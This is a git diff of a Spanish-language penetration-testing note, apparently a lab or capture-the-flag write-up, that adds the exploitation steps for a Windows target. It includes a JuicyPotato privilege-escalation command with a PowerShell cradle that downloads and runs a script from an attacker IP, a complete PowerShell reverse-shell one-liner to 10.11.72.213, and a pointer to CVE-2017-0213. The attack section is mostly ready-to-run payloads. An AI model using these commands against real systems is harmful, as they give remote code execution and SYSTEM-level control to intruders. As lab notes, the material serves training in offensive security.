@@ -180,12 +180,40 @@ Interesting Finding(s):
 ```
 
 ## Explotacion 
+La explotacion se probo realizando con JuicyPotato sin exito. 
 
-## Exploit
+Se levanta el webserver para compartir la informacion desde la maquina del atacante. 
+
+```Bash
+python3 -m http.server
+```
+
+Usamos el siguiente comando para descargar los ficheros en el servidor comprometido. 
+
+![[Descarga de Ficheros - PowerShell#Descarga de FIchero]]
+
+**Descarga de ficheros desde PowerShell **
+
+### Explotacion con Juicy Potato
+
+``` PowerShell
 potato.exe -l 1340 -p rever.bat -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
 .\potato.exe -l 1337 -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.11.72.213/rshell.ps1')" -t *
-`powershell "IEX(New-Object Net.WebClient).downloadString('http://**attackerIP**/rev.ps1')"`
 ```
+
+
+
+``` Powershell
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.11.72.213",3711);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
 ```
+
+
+
+---
+
+![[Descarga de Ficheros - PowerShell#Descarga de script ps1 y ejecucion]]
+
+### Explotacion 
+
+Es  posible realizarlo con el  cve-2017-0213 es ejecutar y wintoWin!!
